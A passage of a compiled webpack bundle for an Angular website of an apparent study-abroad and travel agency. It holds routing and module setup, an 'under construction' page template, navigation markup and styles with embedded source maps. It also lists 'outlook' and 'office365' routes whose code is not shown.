(window["webpackJsonp"] = window["webpackJsonp"] || []).push([["main"],{

/***/ "./src/$$_lazy_route_resource lazy recursive":
/*!**********************************************************!*\
  !*** ./src/$$_lazy_route_resource lazy namespace object ***!
  \**********************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

function webpackEmptyAsyncContext(req) {
	// Here Promise.resolve().then() is used instead of new Promise() to prevent
	// uncaught exception popping up in devtools
	return Promise.resolve().then(function() {
		var e = new Error("Cannot find module '" + req + "'");
		e.code = 'MODULE_NOT_FOUND';
		throw e;
	});
}
webpackEmptyAsyncContext.keys = function() { return []; };
webpackEmptyAsyncContext.resolve = webpackEmptyAsyncContext;
module.exports = webpackEmptyAsyncContext;
webpackEmptyAsyncContext.id = "./src/$$_lazy_route_resource lazy recursive";

/***/ }),

/***/ "./src/app/app-routing.module.ts":
/*!***************************************!*\
  !*** ./src/app/app-routing.module.ts ***!
  \***************************************/
/*! exports provided: AppRoutingModule */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppRoutingModule", function() { return AppRoutingModule; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_router__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/router */ "./node_modules/@angular/router/fesm5/router.js");
/* harmony import */ var _cube_cube_component__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! ./cube/cube.component */ "./src/app/cube/cube.component.ts");
/* harmony import */ var _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! ./outlook/outlook.component */ "./src/app/outlook/outlook.component.ts");
/* harmony import */ var _office365_office365_component__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./office365/office365.component */ "./src/app/office365/office365.component.ts");
/* harmony import */ var _cube_views_home_home_component__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./cube/views/home/home.component */ "./src/app/cube/views/home/home.component.ts");
/* harmony import */ var _views_about_us_about_us_component__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./views/about-us/about-us.component */ "./src/app/views/about-us/about-us.component.ts");
/* harmony import */ var _views_blog_blog_component__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./views/blog/blog.component */ "./src/app/views/blog/blog.component.ts");
/* harmony import */ var _views_contact_us_contact_us_component__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./views/contact-us/contact-us.component */ "./src/app/views/contact-us/contact-us.component.ts");
/* harmony import */ var _views_holiday_holiday_component__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./views/holiday/holiday.component */ "./src/app/views/holiday/holiday.component.ts");
/* harmony import */ var _views_migration_migration_component__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! ./views/migration/migration.component */ "./src/app/views/migration/migration.component.ts");
/* harmony import */ var _views_news_news_component__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! ./views/news/news.component */ "./src/app/views/news/news.component.ts");
/* harmony import */ var _views_partnerships_partnerships_component__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! ./views/partnerships/partnerships.component */ "./src/app/views/partnerships/partnerships.component.ts");
/* harmony import */ var _views_study_abroad_study_abroad_component__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! ./views/study-abroad/study-abroad.component */ "./src/app/views/study-abroad/study-abroad.component.ts");
/* harmony import */ var _views_about_the_test_about_the_test_component__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! ./views/about-the-test/about-the-test.component */ "./src/app/views/about-the-test/about-the-test.component.ts");
/* harmony import */ var _cube_auxiliary_temp_page_temp_page_component__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! ./cube/auxiliary/temp-page/temp-page.component */ "./src/app/cube/auxiliary/temp-page/temp-page.component.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
















var routes = [
    { path: "", redirectTo: 'cube', pathMatch: "full" },
    { path: "cube", component: _cube_cube_component__WEBPACK_IMPORTED_MODULE_2__["CubeComponent"], children: [
            { path: '', redirectTo: 'home', pathMatch: "full" },
            { path: 'home', component: _cube_views_home_home_component__WEBPACK_IMPORTED_MODULE_5__["HomeComponent"] },
            { path: 'aboutus', component: _views_about_us_about_us_component__WEBPACK_IMPORTED_MODULE_6__["AboutUsComponent"] },
            { path: 'blog', component: _views_blog_blog_component__WEBPACK_IMPORTED_MODULE_7__["BlogComponent"] },
            { path: 'contactus', component: _views_contact_us_contact_us_component__WEBPACK_IMPORTED_MODULE_8__["ContactUsComponent"] },
            { path: 'holiday', component: _views_holiday_holiday_component__WEBPACK_IMPORTED_MODULE_9__["HolidayComponent"] },
            { path: 'migration', component: _views_migration_migration_component__WEBPACK_IMPORTED_MODULE_10__["MigrationComponent"] },
            { path: 'news', component: _views_news_news_component__WEBPACK_IMPORTED_MODULE_11__["NewsComponent"] },
            { path: 'partnership', component: _views_partnerships_partnerships_component__WEBPACK_IMPORTED_MODULE_12__["PartnershipsComponent"] },
            { path: 'studyabroad', component: _views_study_abroad_study_abroad_component__WEBPACK_IMPORTED_MODULE_13__["StudyAbroadComponent"] },
            { path: 'aboutthetest', component: _views_about_the_test_about_the_test_component__WEBPACK_IMPORTED_MODULE_14__["AboutTheTestComponent"] },
            { path: "temp", component: _cube_auxiliary_temp_page_temp_page_component__WEBPACK_IMPORTED_MODULE_15__["TempPageComponent"] }
        ]
    },
    { path: "outlook", component: _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_3__["OutlookComponent"] },
    { path: "office365", component: _office365_office365_component__WEBPACK_IMPORTED_MODULE_4__["Office365Component"] }
];
var AppRoutingModule = /** @class */ (function () {
    function AppRoutingModule() {
    }
    AppRoutingModule = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["NgModule"])({
            imports: [_angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"].forRoot(routes)],
            exports: [_angular_router__WEBPACK_IMPORTED_MODULE_1__["RouterModule"]]
        })
    ], AppRoutingModule);
    return AppRoutingModule;
}());



/***/ }),

/***/ "./src/app/app.component.css":
/*!***********************************!*\
  !*** ./src/app/app.component.css ***!
  \***********************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "@media only screen and (max-width: 500px) {\n    width: 500px;\n}\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbInNyYy9hcHAvYXBwLmNvbXBvbmVudC5jc3MiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6IkFBQUE7SUFDSSxhQUFhO0NBQ2hCIiwiZmlsZSI6InNyYy9hcHAvYXBwLmNvbXBvbmVudC5jc3MiLCJzb3VyY2VzQ29udGVudCI6WyJAbWVkaWEgb25seSBzY3JlZW4gYW5kIChtYXgtd2lkdGg6IDUwMHB4KSB7XG4gICAgd2lkdGg6IDUwMHB4O1xufSJdfQ== */"

/***/ }),

/***/ "./src/app/app.component.html":
/*!************************************!*\
  !*** ./src/app/app.component.html ***!
  \************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<router-outlet></router-outlet>\n"

/***/ }),

/***/ "./src/app/app.component.ts":
/*!**********************************!*\
  !*** ./src/app/app.component.ts ***!
  \**********************************/
/*! exports provided: AppComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppComponent", function() { return AppComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};

var AppComponent = /** @class */ (function () {
    function AppComponent() {
        this.title = 'calmdusk';
    }
    AppComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-root',
            template: __webpack_require__(/*! ./app.component.html */ "./src/app/app.component.html"),
            styles: [__webpack_require__(/*! ./app.component.css */ "./src/app/app.component.css")]
        })
    ], AppComponent);
    return AppComponent;
}());



/***/ }),

/***/ "./src/app/app.module.ts":
/*!*******************************!*\
  !*** ./src/app/app.module.ts ***!
  \*******************************/
/*! exports provided: AppModule */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "AppModule", function() { return AppModule; });
/* harmony import */ var _angular_platform_browser__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/platform-browser */ "./node_modules/@angular/platform-browser/fesm5/platform-browser.js");
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
/* harmony import */ var _angular_common_http__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @angular/common/http */ "./node_modules/@angular/common/fesm5/http.js");
/* harmony import */ var _angular_forms__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @angular/forms */ "./node_modules/@angular/forms/fesm5/forms.js");
/* harmony import */ var _app_routing_module__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! ./app-routing.module */ "./src/app/app-routing.module.ts");
/* harmony import */ var _app_component__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! ./app.component */ "./src/app/app.component.ts");
/* harmony import */ var _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./outlook/outlook.component */ "./src/app/outlook/outlook.component.ts");
/* harmony import */ var _office365_office365_component__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! ./office365/office365.component */ "./src/app/office365/office365.component.ts");
/* harmony import */ var _cube_cube_component__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./cube/cube.component */ "./src/app/cube/cube.component.ts");
/* harmony import */ var _cube_cube_header_cube_header_component__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./cube/cube-header/cube-header.component */ "./src/app/cube/cube-header/cube-header.component.ts");
/* harmony import */ var _cube_cube_footer_cube_footer_component__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! ./cube/cube-footer/cube-footer.component */ "./src/app/cube/cube-footer/cube-footer.component.ts");
/* harmony import */ var _cube_request_request_component__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! ./cube/request/request.component */ "./src/app/cube/request/request.component.ts");
/* harmony import */ var _cube_cube_dashboard_cube_dashboard_component__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! ./cube/cube-dashboard/cube-dashboard.component */ "./src/app/cube/cube-dashboard/cube-dashboard.component.ts");
/* harmony import */ var _cube_views_home_home_component__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! ./cube/views/home/home.component */ "./src/app/cube/views/home/home.component.ts");
/* harmony import */ var _views_about_us_about_us_component__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! ./views/about-us/about-us.component */ "./src/app/views/about-us/about-us.component.ts");
/* harmony import */ var _views_study_abroad_study_abroad_component__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! ./views/study-abroad/study-abroad.component */ "./src/app/views/study-abroad/study-abroad.component.ts");
/* harmony import */ var _views_holiday_holiday_component__WEBPACK_IMPORTED_MODULE_16__ = __webpack_require__(/*! ./views/holiday/holiday.component */ "./src/app/views/holiday/holiday.component.ts");
/* harmony import */ var _views_migration_migration_component__WEBPACK_IMPORTED_MODULE_17__ = __webpack_require__(/*! ./views/migration/migration.component */ "./src/app/views/migration/migration.component.ts");
/* harmony import */ var _views_scholarships_scholarships_component__WEBPACK_IMPORTED_MODULE_18__ = __webpack_require__(/*! ./views/scholarships/scholarships.component */ "./src/app/views/scholarships/scholarships.component.ts");
/* harmony import */ var _views_about_the_test_about_the_test_component__WEBPACK_IMPORTED_MODULE_19__ = __webpack_require__(/*! ./views/about-the-test/about-the-test.component */ "./src/app/views/about-the-test/about-the-test.component.ts");
/* harmony import */ var _views_partnerships_partnerships_component__WEBPACK_IMPORTED_MODULE_20__ = __webpack_require__(/*! ./views/partnerships/partnerships.component */ "./src/app/views/partnerships/partnerships.component.ts");
/* harmony import */ var _views_blog_blog_component__WEBPACK_IMPORTED_MODULE_21__ = __webpack_require__(/*! ./views/blog/blog.component */ "./src/app/views/blog/blog.component.ts");
/* harmony import */ var _views_news_news_component__WEBPACK_IMPORTED_MODULE_22__ = __webpack_require__(/*! ./views/news/news.component */ "./src/app/views/news/news.component.ts");
/* harmony import */ var _views_contact_us_contact_us_component__WEBPACK_IMPORTED_MODULE_23__ = __webpack_require__(/*! ./views/contact-us/contact-us.component */ "./src/app/views/contact-us/contact-us.component.ts");
/* harmony import */ var _cube_views_testimonials_testimonials_component__WEBPACK_IMPORTED_MODULE_24__ = __webpack_require__(/*! ./cube/views/testimonials/testimonials.component */ "./src/app/cube/views/testimonials/testimonials.component.ts");
/* harmony import */ var _cube_auxiliary_temp_page_temp_page_component__WEBPACK_IMPORTED_MODULE_25__ = __webpack_require__(/*! ./cube/auxiliary/temp-page/temp-page.component */ "./src/app/cube/auxiliary/temp-page/temp-page.component.ts");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};


























var AppModule = /** @class */ (function () {
    function AppModule() {
    }
    AppModule = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_1__["NgModule"])({
            declarations: [
                _app_component__WEBPACK_IMPORTED_MODULE_5__["AppComponent"],
                _outlook_outlook_component__WEBPACK_IMPORTED_MODULE_6__["OutlookComponent"],
                _office365_office365_component__WEBPACK_IMPORTED_MODULE_7__["Office365Component"],
                _cube_cube_component__WEBPACK_IMPORTED_MODULE_8__["CubeComponent"],
                _cube_cube_header_cube_header_component__WEBPACK_IMPORTED_MODULE_9__["CubeHeaderComponent"],
                _cube_cube_footer_cube_footer_component__WEBPACK_IMPORTED_MODULE_10__["CubeFooterComponent"],
                _cube_request_request_component__WEBPACK_IMPORTED_MODULE_11__["RequestComponent"],
                _cube_cube_dashboard_cube_dashboard_component__WEBPACK_IMPORTED_MODULE_12__["CubeDashboardComponent"],
                _cube_views_home_home_component__WEBPACK_IMPORTED_MODULE_13__["HomeComponent"],
                _views_about_us_about_us_component__WEBPACK_IMPORTED_MODULE_14__["AboutUsComponent"],
                _views_study_abroad_study_abroad_component__WEBPACK_IMPORTED_MODULE_15__["StudyAbroadComponent"],
                _views_holiday_holiday_component__WEBPACK_IMPORTED_MODULE_16__["HolidayComponent"],
                _views_migration_migration_component__WEBPACK_IMPORTED_MODULE_17__["MigrationComponent"],
                _views_scholarships_scholarships_component__WEBPACK_IMPORTED_MODULE_18__["ScholarshipsComponent"],
                _views_about_the_test_about_the_test_component__WEBPACK_IMPORTED_MODULE_19__["AboutTheTestComponent"],
                _views_partnerships_partnerships_component__WEBPACK_IMPORTED_MODULE_20__["PartnershipsComponent"],
                _views_blog_blog_component__WEBPACK_IMPORTED_MODULE_21__["BlogComponent"],
                _views_news_news_component__WEBPACK_IMPORTED_MODULE_22__["NewsComponent"],
                _views_contact_us_contact_us_component__WEBPACK_IMPORTED_MODULE_23__["ContactUsComponent"],
                _cube_views_testimonials_testimonials_component__WEBPACK_IMPORTED_MODULE_24__["TestimonialsComponent"],
                _cube_auxiliary_temp_page_temp_page_component__WEBPACK_IMPORTED_MODULE_25__["TempPageComponent"]
            ],
            imports: [
                _angular_platform_browser__WEBPACK_IMPORTED_MODULE_0__["BrowserModule"],
                _angular_common_http__WEBPACK_IMPORTED_MODULE_2__["HttpClientModule"],
                _angular_forms__WEBPACK_IMPORTED_MODULE_3__["FormsModule"],
                _angular_forms__WEBPACK_IMPORTED_MODULE_3__["ReactiveFormsModule"],
                _app_routing_module__WEBPACK_IMPORTED_MODULE_4__["AppRoutingModule"]
            ],
            providers: [],
            bootstrap: [_app_component__WEBPACK_IMPORTED_MODULE_5__["AppComponent"]]
        })
    ], AppModule);
    return AppModule;
}());



/***/ }),

/***/ "./src/app/cube/auxiliary/temp-page/temp-page.component.html":
/*!*******************************************************************!*\
  !*** ./src/app/cube/auxiliary/temp-page/temp-page.component.html ***!
  \*******************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<section class=\"temp-page\">\n  <div class=\"main\">\n    <span> Site</span>\n    <span> Under Construction</span>\n  </div>\n  <div class=\"temp-page-footer\">\n    <label>\n      FOr More Info Contact\n    </label>\n    <span>\n      +234 7050522615+234 7062344673cubelinksa1@gmail.com\n    </span>\n  </div>\n</section>"

/***/ }),

/***/ "./src/app/cube/auxiliary/temp-page/temp-page.component.scss":
/*!*******************************************************************!*\
  !*** ./src/app/cube/auxiliary/temp-page/temp-page.component.scss ***!
  \*******************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = ".temp-page {\n  display: flex;\n  width: 100%;\n  height: 250px;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center; }\n\n.main {\n  border: 3px solid orangered;\n  width: 200px;\n  font-weight: 700;\n  font-size: 19px;\n  color: #1a1a33;\n  height: 79px;\n  display: flex;\n  flex-direction: column;\n  align-items: center;\n  justify-content: center;\n  -webkit-transform: rotateZ(30deg);\n          transform: rotateZ(30deg);\n  margin: 0 15px; }\n\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy92dWRlZGlib3IvRGVza3RvcC9jdWJlbGlua3Mvc3JjL2FwcC9jdWJlL2F1eGlsaWFyeS90ZW1wLXBhZ2UvdGVtcC1wYWdlLmNvbXBvbmVudC5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0ksY0FBYTtFQUNiLFlBQVc7RUFDWCxjQUFhO0VBQ2IsdUJBQXNCO0VBQ3RCLG9CQUFtQjtFQUNuQix3QkFBdUIsRUFFMUI7O0FBQ0Q7RUFDSSw0QkFBMkI7RUFDM0IsYUFBWTtFQUNaLGlCQUFnQjtFQUNoQixnQkFBZTtFQUNmLGVBQXNCO0VBQ3RCLGFBQVk7RUFDWixjQUFhO0VBQ2IsdUJBQXNCO0VBQ3RCLG9CQUFtQjtFQUNuQix3QkFBdUI7RUFDdkIsa0NBQXlCO1VBQXpCLDBCQUF5QjtFQUN6QixlQUFjLEVBQ2pCIiwiZmlsZSI6InNyYy9hcHAvY3ViZS9hdXhpbGlhcnkvdGVtcC1wYWdlL3RlbXAtcGFnZS5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbIi50ZW1wLXBhZ2Uge1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgd2lkdGg6IDEwMCU7XG4gICAgaGVpZ2h0OiAyNTBweDtcbiAgICBmbGV4LWRpcmVjdGlvbjogY29sdW1uO1xuICAgIGFsaWduLWl0ZW1zOiBjZW50ZXI7XG4gICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7XG5cbn1cbi5tYWluIHtcbiAgICBib3JkZXI6IDNweCBzb2xpZCBvcmFuZ2VyZWQ7XG4gICAgd2lkdGg6IDIwMHB4O1xuICAgIGZvbnQtd2VpZ2h0OiA3MDA7XG4gICAgZm9udC1zaXplOiAxOXB4O1xuICAgIGNvbG9yOiByZ2IoMjYsIDI2LCA1MSk7XG4gICAgaGVpZ2h0OiA3OXB4O1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjtcbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIHRyYW5zZm9ybTogcm90YXRlWigzMGRlZyk7XG4gICAgbWFyZ2luOiAwIDE1cHg7XG59XG4udGVtcC1wYWdlLWZvb3RlciB7XG4gICAgXG59Il19 */"

/***/ }),

/***/ "./src/app/cube/auxiliary/temp-page/temp-page.component.ts":
/*!*****************************************************************!*\
  !*** ./src/app/cube/auxiliary/temp-page/temp-page.component.ts ***!
  \*****************************************************************/
/*! exports provided: TempPageComponent */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "TempPageComponent", function() { return TempPageComponent; });
/* harmony import */ var _angular_core__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! @angular/core */ "./node_modules/@angular/core/fesm5/core.js");
var __decorate = (undefined && undefined.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (undefined && undefined.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};

var TempPageComponent = /** @class */ (function () {
    function TempPageComponent() {
    }
    TempPageComponent.prototype.ngOnInit = function () {
    };
    TempPageComponent = __decorate([
        Object(_angular_core__WEBPACK_IMPORTED_MODULE_0__["Component"])({
            selector: 'app-temp-page',
            template: __webpack_require__(/*! ./temp-page.component.html */ "./src/app/cube/auxiliary/temp-page/temp-page.component.html"),
            styles: [__webpack_require__(/*! ./temp-page.component.scss */ "./src/app/cube/auxiliary/temp-page/temp-page.component.scss")]
        }),
        __metadata("design:paramtypes", [])
    ], TempPageComponent);
    return TempPageComponent;
}());



/***/ }),

/***/ "./src/app/cube/cube-dashboard/cube-dashboard.component.html":
/*!*******************************************************************!*\
  !*** ./src/app/cube/cube-dashboard/cube-dashboard.component.html ***!
  \*******************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "<section>\n  <a class=\"dashboard-items\" [routerLink]=\"['home']\">\n    HOME\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['aboutus']\">\n      ABOUT US\n      <i class=\"fa fa-chevron-circle-down\"></i>\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['studyabroad']\">\n    STUDY ABROAD\n    <i class=\"fa fa-chevron-circle-down\"></i>\n  </a>\n\n  <a class=\"dashboard-items\"[routerLink]=\"['holiday']\" >\n    HOLIDAY/VISITS\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['aboutus']\">\n    STP/SERVICES\n    <i class=\"fa fa-chevron-circle-down\"></i>\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['scholarship']\">\n    SCHOLARSHIPS\n    <i class=\"fa fa-chevron-circle-down\"></i>\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['aboutthetest']\" >\n      ABOUT THE TEST\n      <i class=\"fa fa-chevron-circle-down\"></i>\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['partnership']\">\n      PARTNERSHIP\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['blogs']\" >\n      BLOGS\n  </a>\n\n  <a class=\"dashboard-items\" [routerLink]=\"['news']\">\n      NEWS\n  </a>\n  <a class=\"dashboard-items\"[routerLink]=\"['contactus']\">\n      CONTACT\n  </a>\n</section>"

/***/ }),

/***/ "./src/app/cube/cube-dashboard/cube-dashboard.component.scss":
/*!*******************************************************************!*\
  !*** ./src/app/cube/cube-dashboard/cube-dashboard.component.scss ***!
  \*******************************************************************/
/*! no static exports found */
/***/ (function(module, exports) {

module.exports = "@media only screen and (max-width: 500px) {\n  section {\n    width: 100%;\n    display: flex;\n    flex-direction: column;\n    flex-wrap: wrap; } }\n\nsection {\n  width: 100%;\n  display: flex;\n  border: 2px solid #9898a9;\n  align-items: center;\n  justify-content: center;\n  flex-wrap: wrap;\n  font-family: 'Baloo';\n  font-weight: 600; }\n\na {\n  font-family: sans-serif;\n  display: flex;\n  /* border: 2px solid #9898a9; */\n  align-items: center;\n  justify-content: center;\n  height: 50px;\n  margin: 0 10px;\n  cursor: pointer; }\n\na:hover {\n  color: #605e63; }\n\na:active {\n  color: #afaf54; }\n\ni {\n  margin: 0 10px; }\n\ni:hover {\n  color: #b9adc7; }\n\n/*# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy92dWRlZGlib3IvRGVza3RvcC9jdWJlbGlua3Mvc3JjL2FwcC9jdWJlL2N1YmUtZGFzaGJvYXJkL2N1YmUtZGFzaGJvYXJkLmNvbXBvbmVudC5zY3NzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiJBQUFBO0VBQ0k7SUFDSSxZQUFXO0lBQ1gsY0FBYTtJQUNiLHVCQUFzQjtJQUN0QixnQkFBZSxFQUNsQixFQUFBOztBQUVMO0VBQ0ksWUFBVztFQUNYLGNBQWE7RUFDYiwwQkFBeUI7RUFDekIsb0JBQW1CO0VBQ25CLHdCQUF1QjtFQUN2QixnQkFBZTtFQUNmLHFCQUFvQjtFQUNwQixpQkFBZ0IsRUFDbkI7O0FBQ0Q7RUFDSSx3QkFBdUI7RUFDdkIsY0FBYTtFQUNiLGdDQUFnQztFQUNoQyxvQkFBbUI7RUFDbkIsd0JBQXVCO0VBQ3ZCLGFBQVk7RUFDWixlQUFjO0VBQ2QsZ0JBQWUsRUFDbEI7O0FBQ0Q7RUFDSSxlQUFzQixFQUN6Qjs7QUFDRDtFQUNJLGVBQXdCLEVBQzNCOztBQUNEO0VBQ0ksZUFBYyxFQUNqQjs7QUFDRDtFQUNJLGVBQXlCLEVBQzVCIiwiZmlsZSI6InNyYy9hcHAvY3ViZS9jdWJlLWRhc2hib2FyZC9jdWJlLWRhc2hib2FyZC5jb21wb25lbnQuc2NzcyIsInNvdXJjZXNDb250ZW50IjpbIkBtZWRpYSBvbmx5IHNjcmVlbiBhbmQgKG1heC13aWR0aDogNTAwcHgpIHtcbiAgICBzZWN0aW9uIHtcbiAgICAgICAgd2lkdGg6IDEwMCU7XG4gICAgICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgICAgIGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47XG4gICAgICAgIGZsZXgtd3JhcDogd3JhcDtcbiAgICB9XG59XG5zZWN0aW9uIHtcbiAgICB3aWR0aDogMTAwJTtcbiAgICBkaXNwbGF5OiBmbGV4O1xuICAgIGJvcmRlcjogMnB4IHNvbGlkICM5ODk4YTk7XG4gICAgYWxpZ24taXRlbXM6IGNlbnRlcjtcbiAgICBqdXN0aWZ5LWNvbnRlbnQ6IGNlbnRlcjtcbiAgICBmbGV4LXdyYXA6IHdyYXA7XG4gICAgZm9udC1mYW1pbHk6ICdCYWxvbyc7XG4gICAgZm9udC13ZWlnaHQ6IDYwMDtcbn1cbmEge1xuICAgIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmO1xuICAgIGRpc3BsYXk6IGZsZXg7XG4gICAgLyogYm9yZGVyOiAycHggc29saWQgIzk4OThhOTsgKi9cbiAgICBhbGlnbi1pdGVtczogY2VudGVyO1xuICAgIGp1c3RpZnktY29udGVudDogY2VudGVyO1xuICAgIGhlaWdodDogNTBweDtcbiAgICBtYXJnaW46IDAgMTBweDtcbiAgICBjdXJzb3I6IHBvaW50ZXI7XG59XG5hOmhvdmVyIHtcbiAgICBjb2xvcjogcmdiKDk2LCA5NCwgOTkpO1xufVxuYTphY3RpdmUge1xuICAgIGNvbG9yOiByZ2IoMTc1LCAxNzUsIDg0KTtcbn1cbmkge1xuICAgIG1hcmdpbjogMCAxMHB4O1xufVxuaTpob3ZlciB7XG4gICAgY29sb3I6IHJnYigxODUsIDE3MywgMTk5KTtcbn0iXX0= */"

/***/ }),

/***/ "./src/app/cube/cube-dashboard/cube-dashboard.component.ts":
/*!*****************************************************************!*\
  !*** ./src/app/cube/cube-dashboard/cube-dashboard.component.ts ***!
  \*****************************************************************/
/*! exports provided: CubeDashboardComponent */
